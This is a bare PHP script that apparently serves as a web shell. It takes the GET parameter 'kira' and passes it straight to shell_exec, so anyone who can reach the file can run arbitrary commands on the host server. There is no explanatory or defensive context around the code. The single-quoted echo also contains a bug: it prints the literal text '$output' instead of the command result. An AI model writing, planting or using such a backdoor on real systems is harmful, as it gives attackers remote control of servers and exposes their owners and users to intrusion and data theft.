<?php
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    $cmd = $_GET['kira'];
    if (empty($cmd)) {
        echo "NILL";
    } else {
        $output = shell_exec($cmd);
        echo '<pre>$output</pre>';
    }
}
?>
